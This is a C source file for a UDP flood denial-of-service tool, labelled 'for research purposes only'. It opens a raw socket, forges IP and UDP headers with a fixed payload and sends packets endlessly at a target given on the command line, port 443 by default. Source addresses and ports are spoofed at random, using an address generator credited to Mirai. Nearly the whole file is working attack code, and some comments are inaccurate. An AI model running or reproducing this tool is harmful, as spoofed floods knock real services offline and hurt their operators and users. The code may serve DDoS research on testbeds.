/*
Generate a UDP flood

For research purposes only, please use responsibly

Author: Samuel DeLaughter
License: MIT
*/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <linux/if_ether.h>


#define DEBUG 1 // Set verbosity
#define DELAY 0 // Set delay between packets in seconds
#define RAND_SRC_ADDR 1 // Toggle source address randomization
#define RAND_SRC_PORT 1 // Toggle source port randomization
#define TEST 0

/*
	Maximum total packet size.  This could be larger, but packets over 1500 bytes
	may exceed some path MTUs.  Plus UDP floods tend to use very small packets in
	order to maximize per-packet overhead in the network.
*/
const uint32_t MAX_PACKET_SIZE = 1500;

// Default Source IP, in case we aren't randomizing
const char default_src_addr[32] = "127.0.0.1";

// Placeholder, destination IP must be specified with argv[1]
const char default_dst_addr[32] = "127.0.0.1";

// Default Source Port, in case we aren't randomizing
const uint16_t default_src_port = 9000;

// Destination Port, unless otherwise specified with argv[2]
const uint16_t default_dst_port = 443; // HTTPS

char payload_bytes[] = {
	0xc6, 0x00, 0x00, 0x00, 0x01, 0x14, 0x39, 0xfd,
	0x03, 0xc3, 0xc4, 0x42, 0x11, 0x72, 0xc9, 0x5b,
	0x77, 0x81, 0x99, 0x6e, 0x43, 0xa7, 0xce, 0x10,
	0x37, 0x1a, 0x14, 0x5d, 0x4e, 0x59, 0xe4, 0x79,
	0xa1, 0x33, 0x19, 0x10, 0x7f, 0xb8, 0x6a, 0x6e,
	0x9d, 0x66, 0x41, 0x22, 0x3c, 0xd9, 0xd5, 0x00,
	0x80, 0x00, 0x04, 0x7c, 0xcf, 0x3d, 0x14, 0x28,
	0xc8, 0x25, 0x5d, 0x7f, 0x33, 0xc9, 0x1c, 0xe2,
	0x5a, 0x48, 0x3f, 0x30, 0x95, 0xa2, 0x90, 0xe8,
	0x5b, 0x12, 0xf3, 0x9d, 0xf9, 0x91, 0xa0, 0x5a,
	0xa6, 0xd4, 0x2d, 0x69, 0x8f, 0xa3, 0x5c, 0x29,
	0x9a, 0x0b, 0xec, 0x5e, 0x77, 0xc8, 0x00, 0xa5,
	0xa1, 0xfa, 0x53, 0x68, 0xcb, 0x59, 0xfa, 0x5c,
	0xc6, 0x73, 0xdb, 0xfb, 0x35, 0xcd, 0x61, 0xa3,
	0x79, 0xd5, 0xae, 0xa1, 0xcf, 0xf8, 0xfc, 0x1b,
	0xa2, 0xa6, 0x97, 0xbd, 0x95, 0x19, 0xb8, 0x6c,
	0xf1, 0x74, 0xb6, 0x36, 0xdd, 0x5c, 0x04, 0x70,
	0x4f, 0x4f, 0x56, 0xaa, 0x9e, 0xb1, 0x8d, 0x60,
	0xa5, 0x90, 0xf6, 0x68, 0x9d, 0x45, 0x89, 0x3e,
	0x1b, 0x86, 0x97, 0x4c, 0x15, 0x5e, 0xa6, 0xdd,
	0xd2, 0xe6, 0x40, 0x86, 0x86, 0xd0, 0xa1, 0x95,
	0xdd, 0x0d, 0x7c, 0x8a, 0x4e, 0xa0, 0x8e, 0x86,
	0xb7, 0xa5, 0x93, 0x86, 0xb4, 0xbd, 0xb4, 0x6c,
	0x03, 0x1b, 0xa5, 0x7f, 0x1e, 0x34, 0x5a, 0x8a,
	0x01, 0x4e, 0x6e, 0x32, 0x50, 0x7f, 0x23, 0x66,
	0x57, 0x89, 0x7f, 0xb2, 0x86, 0x00, 0x58, 0xd2,
	0x56, 0x6a, 0x8c, 0x75, 0x24, 0xc9, 0x78, 0xf7,
	0x3f, 0xa7, 0x2b, 0x72, 0x76, 0xc1, 0xe3, 0x17,
	0xef, 0x89, 0x99, 0x12, 0xf1, 0x20, 0x76, 0xcc,
	0xfb, 0x12, 0x14, 0x6d, 0xeb, 0xaa, 0x7b, 0x8b,
	0xc2, 0x8d, 0x01, 0xdd, 0xe6, 0x40, 0xf5, 0x9a,
	0x0d, 0x30, 0x41, 0x71, 0xc1, 0xe4, 0xa3, 0x86,
	0x13, 0x21, 0x4b, 0x0f, 0x0e, 0xf8, 0xfb, 0x73,
	0x4d, 0x6a, 0x2e, 0x25, 0xe8, 0xa9, 0xd3, 0x19,
	0x8f, 0x63, 0x9a, 0x2f, 0x70, 0xed, 0xee, 0x9b,
	0x19, 0x1f, 0xa7, 0xcf, 0x3a, 0xbc, 0x51, 0x2c,
	0xcb, 0x03, 0x38, 0xf5, 0x90, 0x68, 0x65, 0xdf,
	0x78, 0xb1, 0x95, 0x4b, 0xa7, 0xf1, 0x14, 0x2f,
	0x2a, 0xb2, 0x2b, 0xa3, 0x0d, 0x3c, 0x15, 0x11,
	0xa0, 0xd8, 0xc9, 0x98, 0x1a, 0xfe, 0x51, 0x99,
	0xff, 0x6c, 0x69, 0x70, 0x84, 0xe1, 0x60, 0x62,
	0x2b, 0x02, 0x6a, 0x7f, 0x3f, 0x88, 0xda, 0x56,
	0xea, 0x15, 0x88, 0xf7, 0xaf, 0xf4, 0x4a, 0x40,
	0x72, 0x29, 0x8b, 0xad, 0xd9, 0xe2, 0x44, 0x88,
	0xd1, 0xcb, 0x88, 0xad, 0xa6, 0x93, 0x8e, 0x9b,
	0x26, 0x27, 0xed, 0x81, 0xf4, 0xe4, 0x4e, 0x35,
	0xf1, 0xa2, 0xb4, 0x29, 0xf1, 0xc3, 0xca, 0xe3,
	0x5a, 0xce, 0x4e, 0xaa, 0xa2, 0x87, 0x00, 0xc9,
	0x4c, 0x34, 0xf4, 0xcd, 0x68, 0x25, 0xfa, 0xf3,
	0xea, 0x98, 0xe5, 0x9f, 0xb1, 0x49, 0x93, 0xef,
	0xfc, 0x81, 0xb6, 0xd9, 0x82, 0x90, 0x08, 0x17,
	0xff, 0xfa, 0xc2, 0x4b, 0x89, 0x59, 0x43, 0xb7,
	0xae, 0x2c, 0x77, 0x86, 0x12, 0x74, 0x08, 0xa6,
	0x85, 0xc4, 0x1a, 0xf3, 0xdc, 0x72, 0x35, 0xc7,
	0xb3, 0xfd, 0x4d, 0xda, 0xef, 0xfa, 0xd6, 0x75,
	0xc4, 0x21, 0x73, 0x0c, 0x6a, 0x5e, 0x93, 0xba,
	0x05, 0xac, 0x01, 0x97, 0xf5, 0x1e, 0x6f, 0x92,
	0xff, 0xad, 0xc6, 0x05, 0x04, 0x07, 0xf4, 0xea,
	0x93, 0x7a, 0x23, 0x4c, 0xfa, 0xd7, 0xf6, 0xa2,
	0x88, 0x86, 0x35, 0xac, 0x82, 0xc5, 0x3e, 0xc8,
	0xe5, 0xae, 0xba, 0xfe, 0x0a, 0x7d, 0x31, 0x67,
	0xd6, 0x64, 0xf4, 0x00, 0x89, 0x08, 0xf1, 0x41,
	0x19, 0xac, 0x78, 0x78, 0xa5, 0xea, 0xa6, 0x9e,
	0x67, 0x23, 0xed, 0x8a, 0xff, 0x72, 0x7a, 0x2e,
	0x8c, 0x4d, 0xa2, 0x5f, 0x8a, 0x78, 0xba, 0x8a,
	0x37, 0x56, 0x97, 0x2e, 0x12, 0x17, 0x33, 0xf5,
	0x7b, 0x53, 0x4b, 0x32, 0xdc, 0xd0, 0x30, 0x4e,
	0x2a, 0x29, 0x56, 0xa0, 0xec, 0x9a, 0xd1, 0x26,
	0x77, 0x25, 0x66, 0xe8, 0xcd, 0xdf, 0xc3, 0xcf,
	0x2d, 0x6f, 0x1a, 0xf2, 0xcb, 0x8e, 0x48, 0x86,
	0xa3, 0x41, 0x22, 0xb1, 0xea, 0x11, 0xc4, 0xf7,
	0xd7, 0x64, 0x64, 0x1e, 0xdf, 0x6d, 0xd2, 0xb4,
	0x0e, 0x83, 0xa0, 0x27, 0x53, 0x0b, 0x50, 0xf8,
	0x10, 0x8f, 0x2c, 0x6f, 0xfa, 0xfc, 0xb5, 0xd3,
	0x8e, 0xd6, 0xec, 0x67, 0x6a, 0x4c, 0x1f, 0xbb,
	0xce, 0xa0, 0x59, 0x5c, 0x22, 0x7a, 0x93, 0xb4,
	0x95, 0xed, 0xb4, 0x93, 0xd0, 0x85, 0xe2, 0x3a,
	0xf6, 0x54, 0x27, 0x25, 0x4d, 0x3c, 0x95, 0x1e,
	0x27, 0x3a, 0xd5, 0x0e, 0x6e, 0x87, 0x1b, 0x17,
	0x41, 0x4a, 0x83, 0xef, 0x55, 0xc2, 0xf0, 0x9b,
	0x61, 0xf9, 0xfd, 0x02, 0xc8, 0x45, 0xca, 0x4a,
	0xb8, 0xdc, 0xc4, 0xf7, 0x68, 0x2d, 0x31, 0xcb,
	0x0a, 0x28, 0xe0, 0xdb, 0xc0, 0xf7, 0xce, 0x9d,
	0x53, 0x84, 0xf5, 0xb5, 0x4e, 0x8f, 0x9e, 0x3d,
	0x4c, 0x39, 0xa8, 0x40, 0xae, 0x50, 0x44, 0x18,
	0xdb, 0x58, 0x04, 0xc5, 0xa7, 0x8b, 0x89, 0x0e,
	0xb1, 0x53, 0x14, 0x55, 0xde, 0x46, 0xe8, 0x6d,
	0x0e, 0xae, 0x4c, 0x0e, 0xfc, 0x89, 0x14, 0x8d,
	0xb6, 0x93, 0x98, 0xed, 0xe6, 0x0e, 0x05, 0x2f,
	0x16, 0x21, 0xb0, 0x09, 0xa6, 0xff, 0xee, 0x2e,
	0x37, 0xd7, 0x19, 0xab, 0x97, 0xf9, 0x7b, 0x9a,
	0xc7, 0x4c, 0xe6, 0xa1, 0x3f, 0x9e, 0x66, 0xdb,
	0x4f, 0xc8, 0x89, 0xbe, 0x94, 0xc1, 0xe4, 0x98,
	0x9b, 0x53, 0x21, 0x89, 0x45, 0xeb, 0xba, 0xf9,
	0x95, 0xf8, 0x87, 0x30, 0xdf, 0x23, 0x7f, 0x8d,
	0x96, 0x9c, 0xc2, 0x80, 0xe1, 0x2c, 0x49, 0x6d,
	0xdc, 0xa8, 0x31, 0x1d, 0x33, 0xb2, 0xeb, 0xcf,
	0xad, 0x48, 0x09, 0x1f, 0xfb, 0x25, 0x3b, 0x52,
	0x72, 0x97, 0x0b, 0xb8, 0x27, 0xeb, 0xc2, 0x72,
	0x76, 0x85, 0x93, 0x79, 0xda, 0x0d, 0x24, 0x02,
	0x3a, 0x6d, 0xee, 0x27, 0x47, 0x20, 0xb3, 0x9d,
	0x1d, 0x77, 0xd3, 0x34, 0x74, 0x9a, 0xb9, 0x4d,
	0xd1, 0xfe, 0xfc, 0xb4, 0x4a, 0x60, 0xdc, 0xf6,
	0xef, 0xa8, 0xa3, 0x56, 0x82, 0x45, 0xa1, 0x2d,
	0x01, 0x15, 0xf7, 0xe9, 0xd5, 0xe4, 0xf9, 0x4e,
	0x97, 0x0a, 0x3e, 0xa8, 0xea, 0xa3, 0x51, 0xe3,
	0x5c, 0x7f, 0xee, 0x45, 0xdb, 0xa4, 0xe6, 0xfb,
	0x26, 0xfd, 0x20, 0x77, 0x12, 0x1e, 0x73, 0x25,
	0xb7, 0x38, 0x92, 0x65, 0xd1, 0x39, 0x9a, 0x7e,
	0x67, 0x9d, 0xca, 0x50, 0xfb, 0x06, 0xbf, 0x30,
	0x09, 0x7c, 0x8c, 0x41, 0x0d, 0x3e, 0xcc, 0x38,
	0x3b, 0x27, 0xbd, 0x8a, 0x87, 0xea, 0x4c, 0x72,
	0xa1, 0x8c, 0x86, 0xbf, 0x0d, 0x6c, 0x25, 0x62,
	0x67, 0xb9, 0xb2, 0x2d, 0x12, 0x76, 0x94, 0x94,
	0xe6, 0xcd, 0x77, 0xfa, 0x83, 0x58, 0x4c, 0x45,
	0xc8, 0x38, 0x6d, 0xb9, 0x01, 0x9f, 0xc5, 0xd5,
	0x46, 0x61, 0x1c, 0xdb, 0x4e, 0x31, 0xbf, 0xd7,
	0x0d, 0xeb, 0xb2, 0x2a, 0xfe, 0xc8, 0xc3, 0x6c,
	0x90, 0x87, 0xb2, 0x0d, 0xd2, 0x3f, 0x43, 0xaa,
	0xb1, 0x0f, 0xdf, 0x32, 0x2e, 0x54, 0xbb, 0xa4,
	0x1b, 0xbb, 0x5d, 0x97, 0x50, 0x39, 0x3f, 0x5b,
	0x2d, 0x16, 0x4c, 0x01, 0x60, 0xc8, 0x2b, 0x84,
	0x46, 0x81, 0xac, 0xe6, 0x45, 0x04, 0x1c, 0xa8,
	0x7d, 0xdd, 0x51, 0x65, 0x19, 0x5b, 0xd3, 0x6b,
	0x8f, 0xaf, 0x4f, 0x50, 0x3d, 0x14, 0x8b, 0x05,
	0x36, 0xce, 0x8a, 0xae, 0x86, 0x41, 0x3d, 0x88,
	0x35, 0x15, 0xa0, 0x9e, 0xe5, 0xa3, 0x61, 0x6d,
	0x37, 0x14, 0x5a, 0x02, 0xdc, 0x7c, 0x48, 0x64,
	0xe1, 0x35, 0x78, 0xe7, 0x91, 0x86, 0x42, 0x4b,
	0x6e, 0x27, 0x7a, 0xa0, 0xa1, 0x3e, 0x6b, 0x0e,
	0xb9, 0xa7, 0xd6, 0x20, 0x36, 0xd9, 0x89, 0x00,
	0x5e, 0x54, 0x0b, 0xdb, 0xca, 0x75, 0x3d, 0x72,
	0xc9, 0x37, 0x54, 0xb5, 0x3d, 0x31, 0x15, 0x9b,
	0x4f, 0x4b, 0xb7, 0x24, 0x48, 0x62, 0xe0, 0x90,
	0xb7, 0xb7, 0x18, 0xb5, 0x2d, 0xe7, 0x9b, 0xad,
	0xcb, 0x35, 0xd2, 0x1c, 0x98, 0x68, 0x2e, 0x26,
	0x9f, 0x50, 0xa2, 0x49, 0x93, 0x8d, 0x6e, 0xde,
	0xdf, 0x30, 0xaf, 0x89, 0x1c, 0x02, 0x03, 0xd8,
	0xef, 0x30, 0x02, 0xa4, 0x8f, 0xbb, 0x5d, 0x4f,
	0x81, 0x25, 0x2d, 0x54, 0xed, 0xe6, 0x3d, 0x68,
	0x0f, 0xf0, 0xc1, 0xd2, 0x89, 0xfc, 0x5e, 0x7e,
	0xc0, 0x58, 0xfb, 0x62, 0xef, 0x25, 0x3c, 0x20,
	0x9b, 0x65, 0x01, 0xbe, 0xe2, 0x43, 0xb8, 0xfa,
	0xe8, 0x23, 0x57, 0xc0, 0x35, 0xf2, 0xfb, 0xe7,
	0x14, 0xf8, 0x6b, 0x5b, 0x26, 0x00, 0x9a, 0x19,
	0xf8, 0x29, 0xa6, 0x59, 0x64, 0x8e, 0xc4, 0xe4,
	0xa2, 0x56, 0xa3, 0x1f, 0x51, 0x4d, 0x55, 0xe5,
	0xbc, 0x11, 0xce, 0xc8, 0x3b, 0x20, 0x80, 0xc3,
	0xfd, 0x7e, 0xe1, 0xe2, 0x0b, 0xa1, 0xd9, 0x9c,
	0x56, 0x65, 0x59, 0xeb, 0xa5, 0xfa, 0x4e, 0x0a
};

struct pseudo_header {
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};

static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
	// Experimental, beware
	if (old_saddr == iph->saddr){
		return;
	}
	__sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
	sum += ntohs(iph->check);
	sum = (sum & 0xffff) + (sum>>16);
	iph->check = htons(sum + (sum>>16) + 1);
}

static void update_udp_csum(struct iphdr* iph, struct udphdr* udph, __be32 old_saddr) {
	// Experimental, beware
	if (old_saddr == iph->saddr){
		return;
	}
	__sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
	sum += ntohs(udph->check);
	sum = (sum & 0xffff) + (sum>>16);
	udph->check = htons(sum + (sum>>16) + 1);
}
 
// Converts space-delimited IPv4 addresses
// to dotted-decimal format
void checkIPbuffer(char *IPbuffer)
{
    if (NULL == IPbuffer)
    {
        perror("inet_ntoa");
        exit(1);
    }
}

static uint32_t random_ipv4(void) {
	// Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
	uint32_t addr;
	uint8_t o1, o2, o3, o4;

	do {
		addr = (uint32_t)(rand());
		o1 = addr & 0xff;
		o2 = (addr >> 8) & 0xff;
		o3 = (addr >> 16) & 0xff;
		o4 = (addr >> 24) & 0xff;
	}

	while (
		// Skip private and reserved addresses, and DETERLab's network
		// https://en.wikipedia.org/wiki/Reserved_IP_addresses#IPv4

		(o1 == 0) ||                              // 0.0.0.0/8        - Curreent Network
		(o1 == 10) ||                             // 10.0.0.0/8       - Private
		(o1 == 100 && o2 >= 64 && o2 < 128) ||   // 100.64.0.0/10     - Carrier grade NAT
		(o1 == 127) ||                            // 127.0.0.0/8      - Loopback
		(o1 == 169 && o2 == 254) ||               // 169.254.0.0/16   - Link-local
		(o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/12    - Private
		(o1 == 192 &&	(
			(o2 == 0 && (
				o3 == 0 || 														// 192.0.0.0/24			- Private
				o3 == 2																// 192.0.2.0/24			- Documentation
			)) ||
			(o2 == 88 && o3 == 99) ||								// 192.88.99.0/24		- Reserved
			(o2 == 168)															// 192.168.0.0/16		- Private
		)) ||
		(o1 == 198 && (
			(o2 == 18 || o2 == 19) ||								// 198.18.0.0/15		- Private
			(o2 == 51 && o3 == 100)									// 198.51.100.0/24	- Documentation
		)) ||
		(o1 == 203 && o2 == 0 && o3 == 113) ||    // 203.0.113.0/24   - Documentation
		(o1 == 206 && o2 == 117 && o3 == 25) ||		// 206.117.25.0/24	- DeterLab
		(o1 == 206 && o2 == 117 && o3 == 31) ||		// 206.117.31.0/24	- DeterLab High Performance
		(o1 >= 224)                               // 224.0.0.0+       - Various multicast/reserved
	);
	return addr;
}

static uint16_t random_port(void) {
	uint32_t port = (uint32_t)(rand()) & 0xff;
	return port;
}


// The standard function for calculating Internet checksums
unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

int main(int argc, char *argv[]) {
	// Create a raw socket
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_UDP);

	if(s == -1) {
		// Socket creation failed, may be because of non-root privileges
		perror("Failed to create socket, do you have root priviliges?");
		exit(1);
	}

	// Get target (and optionally source) IP address
	char dst_addr[32];
	strcpy(dst_addr, default_dst_addr);
	char src_addr[32];
	strcpy(src_addr, default_src_addr);
	uint16_t dst_port = default_dst_port;
	uint16_t busywait = 0;

	if (argc > 1) {
		strcpy(dst_addr, argv[1]);
		if (argc > 2) {
			busywait = atoi(argv[2]);
			if (argc > 3) {
				strcpy(src_addr, argv[3]);
			}
		}
	} else {
		printf("Please specify a target IP address\n");
		exit(1);
	}

	#if DEBUG
		printf ("Flooding target %s:%u\n", dst_addr, dst_port);

		#if RAND_SRC_ADDR
			printf("Randomizing source address\n");
		#else
			printf("Using source address %s\n", src_addr);
		#endif

		#if RAND_SRC_PORT
			printf("Randomizing source port\n");
		#else
			printf("Using source port %u\n", default_src_port);
		#endif
	#endif


	// Seed RNG
	srand(time(NULL));

	// Byte array to hold the full packet
	char datagram[MAX_PACKET_SIZE];

	// Pointer for the packet payload
	char *data;

	// Pointer for the pseudo-header used in UDP checksum
	char *pseudogram;

	// Zero out the packet buffer
	memset (datagram, 0, MAX_PACKET_SIZE);

	// Initialize headers
	struct iphdr *iph = (struct iphdr *) datagram;
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
	struct pseudo_header psh;

	// UDP Payload
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
	for(int i=0; i<sizeof(payload_bytes); i++) {
		*((uint8_t *) data+i) = payload_bytes[i];
	}
	// strcpy(data, payload_bytes);

	// Address resolution
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(default_dst_port);
	sin.sin_addr.s_addr = inet_addr(dst_addr);

	// IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof(payload_bytes);
	iph->id = htonl(0);	//ID of this packet, can be any value
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(src_addr);
	iph->daddr = sin.sin_addr.s_addr;

	// IP checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	// UDP Header
	udph->source = htons(default_src_port);
	udph->dest = sin.sin_port;
	udph->len = htons(sizeof(struct udphdr) + sizeof(payload_bytes));
	udph->check = 0;

	// UDP checksum
	psh.source_address = inet_addr(src_addr);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.udp_length = htons(sizeof(struct udphdr) + sizeof(payload_bytes));

	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + sizeof(payload_bytes);
	pseudogram = malloc(psize);

	memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + sizeof(payload_bytes));

	udph->check = csum((unsigned short*) pseudogram, psize);

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int option_value = 1;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
		perror("Error setting IP_HDRINCL");
		exit(1);
	}

	__be32 new_saddr = inet_addr(src_addr);

	// Generate packets forever, the caller must terminate this program manually
	while(1) {
		#if RAND_SRC_ADDR || RAND_SRC_PORT
			#if RAND_SRC_ADDR
			// Generate a new random source IP, excluding certain prefixes
				new_saddr = (__be32)(random_ipv4());
			#endif

			#if RAND_SRC_PORT
				udph->source = random_port();
			#endif

			iph->check = 0;
			iph->saddr = new_saddr;
			iph->check = csum ((unsigned short *) datagram, iph->tot_len);

			udph->check = 0;
			psh.source_address = new_saddr;
			memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
			memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + sizeof(payload_bytes));
			udph->check = csum( (unsigned short*) pseudogram , psize);
		#endif

		//Send the packet
		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
			perror("Error sending packet");
		}

		#if DEBUG > 1
			printf("Sent packet from %s:%u to %s:%u\n", iph->saddr, udph->source, iph->daddr, udph->dest);
		#endif

		#if TEST
			break;
		#endif

		#if DELAY
			sleep(DELAY);
		#endif
	}

	return 0;
}
